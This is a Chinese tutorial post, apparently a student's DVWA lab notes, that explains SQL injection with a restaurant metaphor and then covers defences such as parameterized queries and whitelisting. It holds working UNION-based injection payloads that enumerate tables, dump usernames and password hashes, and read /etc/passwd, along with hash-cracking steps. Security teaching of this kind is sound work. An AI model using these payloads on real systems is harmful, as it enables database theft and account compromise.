+++
date = '2026-10-07T18:06:00+08:00'
draft = false
title = '1218656'
tags = ['57867']
categories = ['41473824258']
+++

## 目录

<!-- TOC -->

- [DVWA SQL 注入实验 —— 餐厅比喻版（从判断注入 → 脱库 → 防御）](#dvwa-sql-注入实验--餐厅比喻版从判断注入--脱库--防御)
- [先讲个故事 —— 这家餐厅有大问题](#-第一章先讲个故事--这家餐厅有大问题)
  - [场景设定](#场景设定)
  - [角色对照表（先记住这个）](#-角色对照表先记住这个)
  - [★★★ 核心问题：这个服务员太"听话"了](#-核心问题这个服务员太听话了)
    - [正常情况（你只想查一个用户）](#正常情况你只想查一个用户)
    - [出问题的情况（你在纸条里"夹带私货"）](#出问题的情况你在纸条里夹带私货)
- [完整流程（9 步）](#-第二章完整流程9-步)
  - [第 0 步：进门 + 把门锁打开（必须做）](#-第-0-步进门--把门锁打开必须做)
  - [第 1 步：判断"有没有注入"](#-第-1-步判断有没有注入)
    - [你要做的](#你要做的)
    - [为什么这就能证明有注入](#-为什么这就能证明有注入)
    - [⚠️ 小坑：报错看不见](#-小坑报错看不见)
  - [第 2 步：判断"空格旁边有没有引号"](#-第-2-步判断空格旁边有没有引号)
    - [你要做的](#你要做的-1)
    - [为什么"1 AND 1=1"没反应](#-为什么1-and-11没反应)
  - [第 3 步：判断"后厨的窗口有几个格子"](#-第-3-步判断后厨的窗口有几个格子)
    - [你要做的](#你要做的-2)
    - [原理](#-原理)
    - [⚠️ 关于 # 的坑（★ 很多人卡在这）](#-关于--的坑-很多人卡在这)
  - [第 4 步：找出"哪几个格子能看见"](#-第-4-步找出哪几个格子能看见)
    - [你要做的](#你要做的-3)
    - [为什么开头要用 0 而不是 1（★ 这是最反直觉的地方）](#-为什么开头要用-0-而不是-1-这是最反直觉的地方)
  - [第 5 步：翻"仓库账本" —— 找货架名（★ 最爽的一步）](#-第-5-步翻仓库账本--找货架名-最爽的一步)
    - [你要做的](#你要做的-4)
    - [拆解一下这个 payload](#-拆解一下这个-payload)
  - [️ 第 6 步：继续翻账本 —— 找抽屉名](#-第-6-步继续翻账本--找抽屉名)
    - [你要做的](#你要做的-5)
  - [第 7 步：★★★ 脱库（把账号密码全搬出来）](#-第-7-步-脱库把账号密码全搬出来)
    - [方式 A：一次搬一个（适合看清楚每个）](#方式-a一次搬一个适合看清楚每个)
    - [方式 B：一次全搬出来（★ 推荐，一个 payload 搞定）](#方式-b一次全搬出来-推荐一个-payload-搞定)
    - [payload 拆解（每个符号都有用）](#-payload-拆解每个符号都有用)
  - [第 8 步：破解"暗号"（密码解密）](#-第-8-步破解暗号密码解密)
    - [你偷到的 4 个暗号](#你偷到的-4-个暗号)
    - [怎么查](#怎么查)
  - [第 9 步：为什么 Low 会被注入？（讲给老师听）](#-第-9-步为什么-low-会被注入讲给老师听)
    - [Low：傻服务员（照抄）](#low傻服务员照抄)
    - [Impossible：完美好服务员（参数化查询）](#impossible完美好服务员参数化查询)
- [Payload 速查表（做实验时对着抄）](#-第三章payload-速查表做实验时对着抄)
- [❓ 第四章：常见问题](#-第四章常见问题)
  - [Q1: 输入 1' 什么反应都没有？](#q1-输入-1-什么反应都没有)
  - [Q2: # 后面的内容好像没生效？](#q2--后面的内容好像没生效)
  - [Q3: UNION 查询没结果？](#q3-union-查询没结果)
  - [Q4: 想看详细报错？](#q4-想看详细报错)
  - [Q5: 做完了想恢复？](#q5-做完了想恢复)
- [️ 第五章：怎么防御？（★ 这一章才是重点）](#-第五章怎么防御-这一章才是重点)
  - [先回顾：漏洞到底是怎么产生的](#-先回顾漏洞到底是怎么产生的)
  - [5.1 第一层（根本解）：参数化查询 / 预编译](#-51-第一层根本解参数化查询--预编译)
    - [️ 比喻](#-比喻)
    - [为什么参数化能防住？（★ 面试常问）](#为什么参数化能防住-面试常问)
    - [各种语言的正确写法](#各种语言的正确写法)
    - [⚠️ 一个常见的错解](#-一个常见的错解)
  - [5.2 第二层：输入验证（白名单）](#-52-第二层输入验证白名单)
    - [️ 比喻](#-比喻-1)
    - [代码](#代码)
    - [★★ 白名单 vs 黑名单（重要概念）](#-白名单-vs-黑名单重要概念)
  - [5.3 第三层：转义特殊字符](#-53-第三层转义特殊字符)
    - [️ 比喻](#-比喻-2)
    - [代码](#代码-1)
    - [⚠️ 为什么它不如参数化（一定要知道）](#-为什么它不如参数化一定要知道)
  - [5.4 第四层：最小权限](#-54-第四层最小权限)
    - [️ 比喻](#-比喻-3)
    - [具体怎么做](#具体怎么做)
  - [️ 5.5 第五层：关闭错误回显](#-55-第五层关闭错误回显)
    - [️ 比喻](#-比喻-4)
    - [代码](#代码-2)
  - [️ 5.6 第六层：WAF / RASP](#-56-第六层waf--rasp)
    - [️ 比喻](#-比喻-5)
    - [常见 WAF](#常见-waf)
  - [️ 5.7 第七层：代码审计 + 自动化测试](#-57-第七层代码审计--自动化测试)
    - [️ 比喻](#-比喻-6)
    - [怎么做](#怎么做)
    - [★ 合法地测自己的网站](#-合法地测自己的网站)
- [★ 动手实验 —— 亲眼看到防御生效](#-第六章-动手实验--亲眼看到防御生效)
  - [实验方法](#实验方法)
  - [实验记录表（★ 照着填）](#实验记录表-照着填)
  - [各等级用了什么防御（做完实验再对答案）](#各等级用了什么防御做完实验再对答案)
  - [实验后你应该能回答的问题](#实验后你应该能回答的问题)
- [在你的 Flask 项目里防（对应你的登录页）](#-第七章在你的-flask-项目里防对应你的登录页)
  - [❌ 有漏洞的写法（教学演示用）](#-有漏洞的写法教学演示用)
  - [✅ 正确的写法（你现在的代码）](#-正确的写法你现在的代码)
  - [★ 顺便：密码存储也该改](#-顺便密码存储也该改)
- [✅ 第八章：防御检查清单（照着审自己的代码）](#-第八章防御检查清单照着审自己的代码)
- [实验报告模板（可直接交作业）](#-第九章实验报告模板可直接交作业)
- [一句话总回顾（全用比喻）](#-第十章一句话总回顾全用比喻)
  - [攻击部分（五句话）](#攻击部分五句话)
  - [️ 防御部分（七句话）](#-防御部分七句话)
  - [★★★ 核心一句话](#-核心一句话)
  - [★★ 你现在能回答的三个问题](#-你现在能回答的三个问题)

<!-- /TOC -->

# DVWA SQL 注入实验 —— 餐厅比喻版（从判断注入 → 脱库 → 防御）

> 靶场：DVWA @ `http://192.168.131.132:42001`
> 模块：左侧菜单 → **SQL Injection**
> 后端：MariaDB 11.8.9 / PHP 8.4 · 等级：**Low**

---

# 🍜 第一章：先讲个故事 —— 这家餐厅有大问题

## 场景设定

**★ 你之前的 Flask 笔记里已经学过：Flask = 餐厅，数据库 = 仓库。这里继续用这套比喻。**

```
你（顾客 / 攻击者）
    ↓ 写一张"点菜单"
服务员（后端 PHP 程序）
    ↓ 把你的话【原封不动】抄成一张纸条
死脑筋的后厨（数据库 MariaDB）
    ↓ 纸条上写什么，他就照做什么
仓库（数据库里的表）
```

## 📋 角色对照表（先记住这个）

| 技术名词 | 餐厅里的东西 |
|---|---|
| **数据库** | 仓库 |
| **表 users** | 一个货架，上面挂着牌子写"users" |
| **字段 user / password** | 货架上的抽屉（一栏一栏的） |
| **一行数据** | 一份档案袋（一个用户的全部信息） |
| **SQL 查询语句** | 你递给后厨的**纸条** |
| **后端 PHP 程序** | **抄纸条的服务员** |
| **MariaDB / MySQL** | **死脑筋的后厨** |
| **information_schema** | ★ **仓库的账本**（记录有哪些货架、每个货架有哪些抽屉） |
| **字符串拼接** | 服务员**照抄你的话** ← ★ 问题就在这 |
| **参数化查询** | 服务员只把你的话当"内容"，不当作"指令" |
| **MD5 哈希** | 账本上的**暗号** |
| **脱库** | 把整个账本搬走 |

---

## ★★★ 核心问题：这个服务员太"听话"了

### 正常情况（你只想查一个用户）

```
你在输入框写:  1

服务员抄给后厨的纸条:
    ┌────────────────────────────────────┐
    │ 去仓库 users 货架                   │
    │ 找【编号 = 1】的那份档案             │
    │ 只要 first_name 和 last_name 两个抽屉│
    └────────────────────────────────────┘

后厨: 好的，找到了 → First name: admin    Surname: admin  ✅
```

### 出问题的情况（你在纸条里"夹带私货"）

```
你在输入框写:  1' OR '1'='1

服务员抄给后厨的纸条:
    ┌────────────────────────────────────────────────┐
    │ 去仓库 users 货架                               │
    │ 找【编号 = 1】 或者 【1 等于 1】的档案           │
    │                  ↑★★★ 这句是【你夹带进去的】    │
    │ 只要 first_name 和 last_name 两个抽屉           │
    └────────────────────────────────────────────────┘

后厨（死脑筋）: "1 等于 1" 永远成立啊，那条件为真
              → 随便给你搬一份 → First name: admin  ✅
```

**★★★ 关键点：**
```
★ 服务员没有"分辨能力"—— 他分不清
     "1"        （这是【内容】）
     "OR 1=1"   （这是【指令】）
★ 他把你写的东西【整体】当成了指令抄给了后厨
★ 这就是 SQL 注入（SQL Injection）
```

---

# 🔬 第二章：完整流程（9 步）

## 🚪 第 0 步：进门 + 把门锁打开（必须做）

```
🍽️ 比喻：进餐厅要出示会员卡，而且还得把"危险模式"打开

① 浏览器打开:  http://192.168.131.132:42001/login.php
② 账号密码:    admin / password

③ ★★★【最关键】左侧菜单 → "DVWA Security" → 选 "Low" → Submit
   → 左下角必须显示:  Security Level: low

   ★ 为什么：DVWA 有 4 个等级，相当于 4 种服务员
        Low        = 傻服务员（照抄你的话）      ← 我们要这个
        Medium     = 有点警觉（过滤了一部分符号）
        High       = 很警觉（用了转义）
        Impossible = ★ 完美好服务员（用参数化查询，注不进去）

   ★★★ 如果等级不是 Low，你后面做什么都不会成功
        —— 90% 的"做不出来"都是这个原因

④ 左侧菜单 → "SQL Injection"
⑤ F12 → Network → 勾 Preserve log（顺便练你课程要的 DevTools）
```

**★ 页面长这样：**
```
┌──────────────────────────────────────┐
│ Vulnerability: SQL Injection         │
│                                      │
│ User ID: [        ]  [Submit]        │  ← ★ 你就往这个空格里写东西
│                                      │
│ ┌──────────────────────────────────┐ │
│ │ ID: 1                            │ │
│ │ First name: admin                │ │  ← ★ 后厨搬出来的东西显示在这
│ │ Surname: admin                   │ │
│ └──────────────────────────────────┘ │
└──────────────────────────────────────┘
```

---

## 🔍 第 1 步：判断"有没有注入"

**🍽️ 比喻：你想知道服务员会不会照抄你的话 —— 那就故意在纸条上写一个"多余的字"，看后厨会不会噎住。**

### 你要做的

| 输入框里写 | 点 Submit 后你会看到 | 说明 |
|---|---|---|
| `1` | `First name: admin` | 正常，后厨干活了 ✅ |
| **`1'`** | **报错 / 一片空白 / 异常** | ★★★ **后厨噎住了！** |

### 💡 为什么这就能证明有注入

```
★ 那个单引号 ' ，在 SQL 里是"引号的结束符"
★ 你多写一个，纸条上的引号就不配对了 → 后厨看不懂 → 报错

★★★ 反过来想：
     如果你写的 ' 只是被当【普通文字】，
     后厨根本不会噎住，他会去仓库找"编号叫 1' 的用户"
     → 现在他噎住了
     → 说明你的 ' 真的被当成了【指令】！
     → 所以 存在注入 ✅
```

**★★ 类比：你跟服务员说"来一份红烧肉'"，结果后厨崩溃了 —— 说明那个引号进了厨房，而不是被当成菜名的一部分。**

### ⚠️ 小坑：报错看不见

```
★ DVWA 默认关了错误显示，可能只显示空白
★ 判断变通一下:
     输入 1   → 有 admin
     输入 1'  → 空白
     → 两种情况不同 = 你的 ' 起作用了 = 有注入 ✅
```

---

## 🔑 第 2 步：判断"空格旁边有没有引号"

**🍽️ 比喻：纸条上原本的写法可能有两种 ——**

```
写法 A:  找【编号 = 1】          ← 没引号包裹，直接写数字
写法 B:  找【编号 = '1'】        ← ★ 有引号包裹
```

**★ 如果是写法 B（有引号），你写的内容就"卡在引号里出不来" —— 你必须先写一个 `'` 把引号"关上"，才能开始写指令。**

### 你要做的

| 输入框里写 | 你会看到 | 结论 |
|---|---|---|
| `1 AND 1=1` | **空白** | 不是数字型 |
| **`1' AND '1'='1`** | **返回 admin** ✅ | ★ **是字符型（有引号包裹）** |
| `1' AND '1'='2` | 空白 | 条件可控 ✅ |

### 💡 为什么"1 AND 1=1"没反应

```
★ 后厨收到的纸条:
     找【编号 = '1 AND 1=1'】
                    ↑ 整串被当成一个"名字"了！
★ 仓库里没有哪个用户的编号叫 "1 AND 1=1" → 空白

★★ 而 1' AND '1'='1 会变成:
     找【编号 = '1'】 并且 【'1' = '1'】
                    ↑ 引号关上了！   ↑ 这个条件永远成立
     → 成功 ✅
```

**★★ 结论：DVWA 是"字符型"，而且用单引号 `'` 闭合。**

---

## 📦 第 3 步：判断"后厨的窗口有几个格子"

**🍽️ 比喻：后厨搬东西有个规矩 —— 他每次固定搬【2 样东西】（first_name 和 last_name），就像窗口有 2 个格子。**

```
★ 你想用 UNION（"顺便再搬点别的"），
  后厨会说: "你搬的东西数量必须和我一样，不然我放不下！"

★★ 所以你必须先知道：这个窗口到底有几个格子？
```

### 你要做的

| 输入框里写 | 你会看到 |
|---|---|
| `1' ORDER BY 1 #` | 正常 |
| **`1' ORDER BY 2 #`** | **正常** ← 至少 2 个格子 |
| **`1' ORDER BY 3 #`** | **报错** ← ★ 所以就是 **2 个格子** |

### 💡 原理

```
ORDER BY 是"按第几个格子排序"的意思
★ 说"按第 2 个格子排序" → 后厨照做 → 正常
★ 说"按第 3 个格子排序" → 根本没有第 3 个 → 后厨噎住

★★ 就像你说"把第 3 个抽屉的东西整理一下"，
   但柜子只有 2 个抽屉 → 后厨懵了
```

**★★ 进阶技巧：格子多的时候用"二分法"（先试 5，再试 3 或 8…），比一个个试快**

### ⚠️ 关于 `#` 的坑（★ 很多人卡在这）

```
★ # 在 SQL 里是"从这里开始，后面全部作废"的意思（注释）

★★★ 使用注意:
     在【输入框里】写 → 直接写 # 就行（浏览器会自动编码成 %23）
     在【地址栏里】手改 URL → 必须写 %23
        因为 # 在网址里表示"锚点"，后面全被浏览器丢掉！

★ 备选写法:  -- （横杠横杠 + 空格），在网址里写成 --+
```

---

## 👀 第 4 步：找出"哪几个格子能看见"

**🍽️ 比喻：后厨搬了 2 样东西，但只有 2 个格子能显示给你看。你得先知道：放第 1 个格子的东西显示在哪？放第 2 个的呢？**

### 你要做的

**★ 输入框里写：**
```
0' UNION SELECT 111,222 #
```

**★ 你会看到：**
```
First name: 111       ← ★ 这是"第 1 个格子"的位置
Surname: 222          ← ★ 这是"第 2 个格子"的位置
```

### 💡 为什么开头要用 `0` 而不是 `1`（★ 这是最反直觉的地方）

```
★★★ DVWA 的 Low 等级有个特点：只给你看【第一行】结果

★ 如果你写 id=1 :
     原查询先找到 admin 那份档案 → 它排第一行
     → 你 UNION 搬来的东西排在第二行 → 你看不到 ❌

★ 如果你写 id=0 :
     仓库里没有编号 0 的用户 → 原查询空的
     → 你 UNION 搬来的东西就成了第一行 → 你能看到 ✅

★★ 就像: 后厨先把原来的菜摆上桌，你加点的菜就放后面看不见了
        你先说"原来那道菜不要"（id=0），你加点的菜就摆前面了
```

**★★ 这就是为什么教科书里的 payload 老写 `id=0` 或 `id=-1`。**

---

## 📖 第 5 步：翻"仓库账本" —— 找货架名（★ 最爽的一步）

**🍽️ 比喻：你想偷仓库里的东西，但不知道货架叫什么名字。好在仓库里有一本【账本】，专门记录"有哪些货架、每个货架有哪些抽屉"。这本账本叫 `information_schema`。**

```
★★★ information_schema 是 MySQL/MariaDB 自带的"元数据仓库"
     里面有几张关键的"账本页":

     schemata    = 有哪些仓库（数据库）
     tables      = 有哪些货架（表）+ 属于哪个仓库
     columns     = 每个货架有哪些抽屉（字段）
```

### 你要做的

**★ 输入框里写（一口气把货架名都搬出来）：**
```
0' UNION SELECT group_concat(table_name), 2 FROM information_schema.tables WHERE table_schema=database() #
```

**★ 你会看到：**
```
First name: users
Surname: 2
```

**★★★ 看到 `users` 这三个字的时候，实验就成功一大半了 —— 目标货架找到了！**

### 💡 拆解一下这个 payload

```
0'                                        ← 让原查询空（前面讲的技巧）
UNION SELECT                              ← "顺便再搬这些"
    group_concat(table_name),             ← ★ 把多个货架名拼成一个（不然只显示第一行）
    2                                     ← 第 2 个格子随便填个占位
FROM information_schema.tables            ← ★ 从"账本"的"货架页"里找
WHERE table_schema = database()           ← 只要当前这个仓库的
#
```

**★ `group_concat` 的比喻：**
```
★ 不加它 → 后厨一次只报一个货架名（因为只给你看第一行）
★ 加了它 → 后厨把【所有货架名】用逗号串成一串，一起塞进第 1 个格子 ✅
```

---

## 🗄️ 第 6 步：继续翻账本 —— 找抽屉名

**🍽️ 比喻：知道货架叫 `users` 了，但不知道上面有哪些抽屉。继续查账本的"抽屉页"。**

### 你要做的

**★ 输入框里写：**
```
0' UNION SELECT group_concat(column_name), 2 FROM information_schema.columns WHERE table_name='users' #
```

**★ 你会看到：**
```
First name: user_id,first_name,last_name,user,password,avatar,last_login,failed_login
                                 ↑       ↑
                          ★★★ 目标就是这两个抽屉！
Surname: 2
```

**★★ 找到 `user` 和 `password` —— 这就是我们要偷的东西。**

---

## 💰 第 7 步：★★★ 脱库（把账号密码全搬出来）

**🍽️ 比喻：货架位置知道了，抽屉名字也知道了 —— 现在直接让后厨把那两个抽屉里的东西【全部】搬出来。**

### 方式 A：一次搬一个（适合看清楚每个）

```
0' UNION SELECT user, password FROM users LIMIT 0,1 #   → admin
0' UNION SELECT user, password FROM users LIMIT 1,1 #   → gordonb
0' UNION SELECT user, password FROM users LIMIT 2,1 #   → 1337
0' UNION SELECT user, password FROM users LIMIT 3,1 #   → pablo
```

**★ `LIMIT 0,1` 的意思：跳过 0 份，取 1 份（就是第 1 份）；`LIMIT 1,1` 就是第 2 份，以此类推。**

### 方式 B：一次全搬出来（★ 推荐，一个 payload 搞定）

**★ 输入框里写：**
```
0' UNION SELECT group_concat(user, 0x3a, password SEPARATOR 0x0a), 2 FROM users #
```

**★ 你会看到：**
```
First name: admin:5f4dcc3b5aa765d61d8327deb882cf99
            gordonb:e99a18c428cb38d5f260853678922e03
            1337:8d3533d75ae2c3966d7e0d4fcc69216b
            pablo:0d107d09f5bbe40cade3de5c71e9e9b7
Surname: 2
```

**★★★ 这就是"脱库"—— 把整个用户表拖出来了！**

### 💡 payload 拆解（每个符号都有用）

```
group_concat(
    user,           ← 第 1 个抽屉（用户名）
    0x3a,           ← 中间插个分隔符  0x3a 是十六进制的 ":"（冒号）
    password,       ← 第 2 个抽屉（密码）
    SEPARATOR 0x0a  ← 每份档案之间用  0x0a 分隔（十六进制的换行）
)
, 2                 ← 第 2 个格子填个占位
FROM users          ← 从 users 这个货架搬
#
```

**★ 为什么用 `0x3a` 而不是直接写 `:` ？**
```
★ 因为 URL 和 SQL 里有些字符会打架
★ 用十六进制写更保险（0x3a = 冒号，0x0a = 换行）
```

---

## 🔓 第 8 步：破解"暗号"（密码解密）

**🍽️ 比喻：你偷到的不是明文密码，而是【暗号】—— 仓库账本上存的是暗号，不是原文。**

```
★ DVWA 把密码存成了 MD5 哈希（32 位十六进制）
★ MD5 是【单向】的：算得出来，但倒不回去
★ 但这些暗号早就在"暗号字典"里被记录过了 → 一查就出来
```

### 你偷到的 4 个暗号

| 用户名 | 暗号（MD5） | 原文 | 怎么知道的 |
|---|---|---|---|
| **admin** | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` | ★ DVWA 默认密码 |
| **gordonb** | `e99a18c428cb38d5f260853678922e03` | `abc123` | |
| **1337** | `8d3533d75ae2c3966d7e0d4fcc69216b` | `charley` | |
| **pablo** | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein` | |

### 怎么查

```
① 在线"暗号字典"（免费）:
     https://crackstation.net/
     https://md5decrypt.net/

② 本地工具（如果你装了 hashcat）:
     hashcat -m 0 hash.txt rockyou.txt

③ 直接猜: DVWA 的默认密码就是 password
```

**★★★ 这一步的意义（考试会问）：**
```
★ 就算数据库被拖走了，密码也不该是"能反查出来的"
★ 正确做法: 用 bcrypt / argon2 这类【加盐慢哈希】
     → 每个密码加不同的"盐"
     → 算一次要 0.1 秒（正常登录感觉不到）
     → 但攻击者跑 10 亿次字典就要好几年
★ 这就是你密码学课要学的内容 ✅
```

---

## 🧠 第 9 步：为什么 Low 会被注入？（讲给老师听）

**★ 在 DVWA 页面上点 "View Source"，能看到后端代码。四个等级对比：**

### Low：傻服务员（照抄）

```php
$id = $_GET['id'];                    // ← 你的话，一个字没改

$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
//                                                              ↑
//                                                ★ 直接拼进去 → 有问题
```

**🍽️ 比喻：服务员把你的话一字不差抄到纸条上，包括你夹带的"咒语"。**

### Impossible：完美好服务员（参数化查询）

```php
$id = $_GET['id'];
$id = stripslashes($id);                          // 去掉多余的反斜杠
$id = mysqli_real_escape_string($mysqli, $id);    // ★ 把你的 ' 变成 \'
if (is_numeric($id)) {                            // ★ 必须纯数字
    $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
}
```

**🍽️ 比喻：三层把关**
```
① stripslashes       —— 把多余的反斜杠抹掉
② real_escape_string —— ★ 你写的 ' 会被改写成 \' → 引号关不上了！
③ is_numeric         —— ★ 必须是纯数字，不然根本不交给后厨
```

**★★★ 但最根本的解法是这个（比上面三个都好）：**

```php
$stmt = $mysqli->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("s", $id);    // ★ 把 id 当【内容】绑定，不当作【指令】
$stmt->execute();
```

**🍽️ 比喻：填表格（这就是你 Flask 笔记里学过的）**
```
❌ 字符串拼接 = 让顾客口述菜名，服务员可以乱理解
✅ 参数化查询 = 给顾客一张【印好的固定表格】，他只能往空格里填字

★ 你填 "1' OR '1'='1" → 后厨只理解成 "有个用户编号叫 1' OR '1'='1"
                       → 查不到 → 拒绝 ✅
★ 因为表格的【结构】是提前定好的，顾客改不了
```

---

# 📋 第三章：Payload 速查表（做实验时对着抄）

```
【判断注入】
1
1'

【判断类型】
1 AND 1=1
1' AND '1'='1
1' AND '1'='2

【判断列数】
1' ORDER BY 2 #
1' ORDER BY 3 #

【找显示位】
0' UNION SELECT 111,222 #

【翻账本 · 摸环境】
0' UNION SELECT database(), user() #
0' UNION SELECT version(), @@version_compile_os #

【翻账本 · 找货架名】
0' UNION SELECT group_concat(table_name), 2 FROM information_schema.tables WHERE table_schema=database() #

【翻账本 · 找抽屉名】
0' UNION SELECT group_concat(column_name), 2 FROM information_schema.columns WHERE table_name='users' #

【脱库 · 一次一个】
0' UNION SELECT user, password FROM users LIMIT 0,1 #

【脱库 · 一次全部 ★】
0' UNION SELECT group_concat(user, 0x3a, password SEPARATOR 0x0a), 2 FROM users #

【看有没有读文件权限】
0' UNION SELECT load_file('/etc/passwd'), 2 #
```

---

# ❓ 第四章：常见问题

## Q1: 输入 `1'` 什么反应都没有？

```
① ★★★ 检查安全等级是不是 Low（左下角看）
② 确认在 "SQL Injection" 模块（不是 SQL Injection Blind）
③ 试试 1''，如果这个正常 → 说明确实是引号问题 → 有注入
```

## Q2: `#` 后面的内容好像没生效？

```
① 在【输入框里】输入没问题（浏览器自动编码）
② 在【地址栏】手改 URL → 把 # 写成 %23
③ 或者改用 -- （横杠横杠空格），网址里写 --+
```

## Q3: UNION 查询没结果？

```
检查清单:
  ✅ 列数对不对（DVWA 是 2 列）
  ✅ 前面用了 0 或 -1 吗
  ✅ 结尾有注释符吗（# 或 -- ）
  ✅ 引号闭合了吗（DVWA 用单引号）
```

## Q4: 想看详细报错？

```
改 Kali 里的 /etc/dvwa/config/config.inc.php
把 display_errors 打开，重启 php-fpm
（可选，不看报错也能做实验）
```

## Q5: 做完了想恢复？

```
DVWA 里 → Setup / Reset DB → 点 "Create / Reset Database"
或 Kali 虚拟机 → VMware 快照回滚
```

---

# 🛡️ 第五章：怎么防御？（★ 这一章才是重点）

## 🍜 先回顾：漏洞到底是怎么产生的

```
★★★ 一句话:
     服务员（程序）把顾客的话（输入）当成了【指令】抄给后厨（数据库）

★★ 所以防御的核心思路只有一句话:
     ★ 让顾客的话永远是【内容】，永远变不成【指令】

★★ 下面七层防御，从最重要到最次要排列。
     第 1 层是根本解，后面几层都是"补丁"。
```

---

## 🥇 5.1 第一层（根本解）：参数化查询 / 预编译

### 🍽️ 比喻

```
❌ 字符串拼接（有漏洞）
     顾客口述菜名 → 服务员照着写 → 顾客可以夹带"咒语"

✅ 参数化查询（安全）
     给顾客一张【印好的固定表格】:

         ┌──────────────────────────┐
         │ 菜名: [____________]     │  ← 顾客只能往空格里填字
         │ 份数: [____________]     │
         └──────────────────────────┘

     ★ 表格的【结构】是提前定好的，顾客改不了
     ★ 顾客填 "1' OR '1'='1" → 后厨理解成"有个菜名叫 1' OR '1'='1"
                             → 查不到 → 拒绝 ✅
```

### 为什么参数化能防住？（★ 面试常问）

```
★★★ 关键在于【两步分开】:

   第一步：把 SQL 的"结构"（骨架）先编译好
              SELECT first_name FROM users WHERE user_id = ?
                                                        ↑ 这里只是个"洞"

   第二步：再把你的输入【填进那个洞】
              → 你的输入只被当成"值"，永远不会被当成"结构"

★ 而字符串拼接是【一步到位】:
     把你的输入和 SQL 骨架揉在一起 → 数据库分不清哪是骨架哪是内容
     → 你写的 OR 1=1 就变成了骨架的一部分 → 生效 ❌
```

### 各种语言的正确写法

**★ PHP（DVWA 用的语言）**

```php
// ❌ 错误：直接拼接
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($conn, $query);

// ✅ 正确：参数化查询（预处理语句）
$stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("s", $id);        // "s" = string，把 $id 当【值】绑定
$stmt->execute();
$result = $stmt->get_result();
```

**★ Python / Flask（你写过的那个登录页）**

```python
# ❌ 错误：f-string 拼接
sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
row = conn.execute(sql).fetchone()

# ✅ 正确：参数化查询（你现在的代码就是这个）
row = conn.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    (username, password)          # ★ 参数单独传，不拼进 SQL
).fetchone()
```

**★★ 注意：你现在的 Flask 登录页用的就是正确写法 ✅**
**（想演示漏洞需要手动改成拼接版，演示完记得改回来）**

**★ Java**

```java
// ❌ 错误
Statement st = conn.createStatement();
ResultSet rs = st.executeQuery("SELECT * FROM users WHERE name = '" + name + "'");

// ✅ 正确
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
ps.setString(1, name);            // ★ 单独设值
ResultSet rs = ps.executeQuery();
```

**★ 各种 ORM（如果你用框架，基本自动安全）**

```python
# SQLAlchemy
User.query.filter_by(username=username).first()      # ✅ 自动参数化

# Django
User.objects.filter(username=username)                # ✅ 自动参数化

# ★ 但如果你在 ORM 里写原生 SQL，还是要小心:
User.objects.raw(f"SELECT * FROM users WHERE name='{name}'")   # ❌ 又拼回去了
```

### ⚠️ 一个常见的错解

```
❌ 有人以为"用引号包起来就安全了":
     $query = "SELECT * FROM users WHERE id = '$id'";   // ← 加引号也挡不住

★ 因为顾客可以自己写一个单引号【把引号关上】:
     输入 1' OR '1'='1   →  SQL 变成:
     ... WHERE id = '1' OR '1'='1'   ← 引号被顾客自己闭合了

★★ 记住：加引号不是防御，只是"结构"的一部分，顾客能改
```

---

## 🥈 5.2 第二层：输入验证（白名单）

### 🍽️ 比喻

```
★ 后厨说: "我们只有 1-5 号套餐，其他都不做"

★ 顾客写 "1' OR '1'='1" → 服务员一查: 这不是 1-5 号 → 直接拒绝
★ 顾客写 "3"           → 是有效套餐号 → 正常处理 ✅
```

### 代码

```php
// PHP：只允许纯数字
$id = $_GET['id'];
if (!is_numeric($id)) {
    die("参数错误");            // ★ 不是数字就拒绝
}
$id = (int)$id;                 // ★ 强制转成整数，双保险
$query = "SELECT ... WHERE user_id = $id";   // 此时 $id 一定是数字，安全
```

```python
# Python / Flask
user_id = request.args.get('id', '')
if not user_id.isdigit():        # ★ 不是纯数字就拒绝
    return "参数错误", 400
user_id = int(user_id)           # ★ 强制转整数
```

### ★★ 白名单 vs 黑名单（重要概念）

| | 白名单（推荐） | 黑名单（不推荐） |
|---|---|---|
| 思路 | 只允许"已知安全"的 | 挡住"已知危险"的 |
| 例子 | `只允许 0-9` | `过滤掉 ' " -- # union` |
| 安全性 | ✅ 高（漏不了） | ❌ 低（总有绕过方法） |
| 比喻 | 门卫: "名单上的人才能进" | 门卫: "长得像坏人的不许进" |

**★★ 黑名单为什么不行？**
```
★ 你过滤了 union，攻击者用 UnIoN（大小写）
★ 你过滤了空格，攻击者用 /**/ 或 %09（制表符）
★ 你过滤了单引号，攻击者用 0x 十六进制编码
★ 你过滤了 #，攻击者用 -- 或 ;%00
→ 永远有你想不到的绕过方式
```

**★ 还有个技巧：如果参数应该是数字，就别用字符串处理它**
```
★★ 最狠的验证就是"类型正确":
     (int)$id   →  一个整数【不可能】包含 SQL 代码
     因为整数里只能有数字 ✅
```

---

## 🥉 5.3 第三层：转义特殊字符

### 🍽️ 比喻

```
★ 服务员在顾客写的字【外面套一层壳】，让它变成"纯文字":

     顾客写: 1' OR '1'='1
     服务员改写: 1\' OR \'1\'=\'1
                  ↑ 那个 \ 就是"壳"

★ 后厨看到 \' → 理解成"这是一个普通的单引号字符"
                → 不会把它当成"引号的结束"
                → 顾客的引号关不上了 ✅
```

### 代码

```php
// PHP
$id = mysqli_real_escape_string($conn, $_GET['id']);   // ★ 转义
$query = "SELECT ... WHERE user_id = '$id'";
```

```python
# Python：用 DB-API 的参数化更好，如果非要手拼
# 可以用 conn.escape_string()（但强烈建议直接参数化）
```

**★ DVWA 的 Medium 等级用的就是这招（+ 一个 str_replace）**

### ⚠️ 为什么它不如参数化（一定要知道）

```
★★ 三个问题:

① 【容易漏】
     一个项目里有 200 处 SQL 查询，你漏了一处 → 那一处就是漏洞
     参数化是"结构性的"，写完就不会漏

② 【和数据库类型绑定】
     mysql_real_escape_string 只对 MySQL 有用
     换个数据库（PostgreSQL / SQL Server）→ 行为不一样
     参数化是标准做法，跨数据库通用

③ 【编码问题会失效】
     ★ 宽字节注入（GBK 编码下）:
